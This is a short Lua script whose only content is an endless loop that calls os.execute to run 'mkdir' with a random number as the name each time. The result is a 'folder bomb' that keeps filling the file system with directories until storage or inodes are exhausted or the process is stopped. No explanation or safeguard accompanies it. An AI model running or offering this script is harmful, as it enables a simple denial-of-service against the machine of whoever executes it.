for i = 1, math.huge do
    local folders = math.random()
    local folder = os.execute("mkdir" .. " " .. folders)
end
